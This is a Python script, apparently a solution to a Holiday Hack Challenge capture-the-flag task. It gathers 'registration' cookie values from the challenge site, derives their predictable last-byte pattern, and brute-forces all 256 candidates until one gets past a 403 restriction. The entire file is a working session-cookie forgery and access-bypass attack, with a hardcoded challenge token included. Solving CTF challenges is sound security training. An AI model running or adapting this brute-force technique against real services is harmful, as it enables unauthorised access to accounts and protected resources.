#!/usr/bin/env python3

"""
This script interacts with a remote web service that uses cookies
for authentication/authorization.

High-level flow:
1. Create a session and set a required authentication cookie.
2. Make multiple requests to collect "registration" cookie values.
3. Analyze those values to determine a predictable pattern.
4. Generate candidate cookie values based on that pattern.
5. Try each candidate until one successfully bypasses a restriction.
"""

import requests
from pprint import pprint


# --- Configuration constants ---
SCHRODINGER_TOKEN = "de3cee47-cbe6-434d-be0f-7f347ffb637f"
PARAM_ID = "39c71acd-2d2e-4fa6-8617-d618cce17269"

BASE_URL = "https://flask-schrodingers-scope-firestore.holidayhackchallenge.com"
REGISTER_URL = f"{BASE_URL}/register/?id={PARAM_ID}"
TARGET_URL = f"{BASE_URL}/register/courses/wip/holiday_behavior?id={PARAM_ID}"


def collect_registration_cookies(session, url, attempts=50):
    """
    Perform multiple requests to collect unique 'registration' cookie values.

    Args:
        session (requests.Session): Active HTTP session with cookies set.
        url (str): Endpoint to hit repeatedly.
        attempts (int): Number of requests to make.

    Returns:
        set: Unique registration cookie values observed.
    """
    registration_cookies = set()

    for _ in range(attempts):
        response = session.get(url)
        cookie_value = response.cookies.get("registration")

        if cookie_value:
            registration_cookies.add(cookie_value)

    return registration_cookies


def derive_prefix_and_start(cookie_values):
    """
    Analyze collected cookie values to extract:
    - A common prefix
    - A starting point (last byte interpreted as hex)

    Assumes the last two characters of the cookie are a hex byte.

    Args:
        cookie_values (set): Observed cookie values.

    Returns:
        tuple: (prefix (str), start (int))
    """
    min_value = min(cookie_values)

    prefix = min_value[:-2]          # everything except last byte
    start = int(min_value[-2:], 16)  # last byte as hex

    return prefix, start


def generate_candidate_cookies(prefix, start):
    """
    Generate a list of candidate cookie values by iterating over
    256 possible byte values, starting from a known point.

    Args:
        prefix (str): Shared prefix of cookie values.
        start (int): Starting byte value.

    Returns:
        list: Candidate cookie strings.
    """
    candidates = []

    for i in range(start, start + 0x100):
        # Use bitmask (& 0xff) to wrap around after 255
        candidates.append(f"{prefix}{(i & 0xff):02x}")

    return candidates


def test_candidates(session, candidates, target_url):
    """
    Try each candidate cookie against the protected endpoint.

    Stops when a successful (non-403) response is found.

    Args:
        session (requests.Session): Active HTTP session.
        candidates (list): Candidate cookie values.
        target_url (str): Endpoint requiring valid cookie.
    """
    total = len(candidates)

    for index, candidate in enumerate(candidates, start=1):
        # Set the candidate cookie
        session.cookies.set(name="registration", value=candidate)

        response = session.get(target_url)

        # Check if access is granted (not 403)
        result = "NOPE" if response.status_code == 403 else "YES"
        print(f"[{index}/{total}] Register: {candidate} => {result}")

        # Stop if we found a valid cookie
        if result == "YES":
            break


def main():
    """
    Main entry point of the script.
    Orchestrates the workflow step by step.
    """
    # Create a session to persist cookies across requests
    with requests.Session() as session:
        # Set initial required authentication cookie
        session.cookies.set(
            name="Schrodinger",
            value=SCHRODINGER_TOKEN
        )

        # Step 1: Collect sample cookie values
        cookies = collect_registration_cookies(session, REGISTER_URL)

        print(f"Collected {len(cookies)} unique registration cookies:")
        pprint(cookies)

        # Step 2: Analyze cookie structure
        prefix, start = derive_prefix_and_start(cookies)
        print(f"\nDerived prefix: {prefix}")
        print(f"Starting byte (hex): {start:02x}")

        # Step 3: Generate candidate cookies
        candidates = generate_candidate_cookies(prefix, start)

        # Step 4: Test candidates against protected endpoint
        test_candidates(session, candidates, TARGET_URL)


if __name__ == "__main__":
    main()
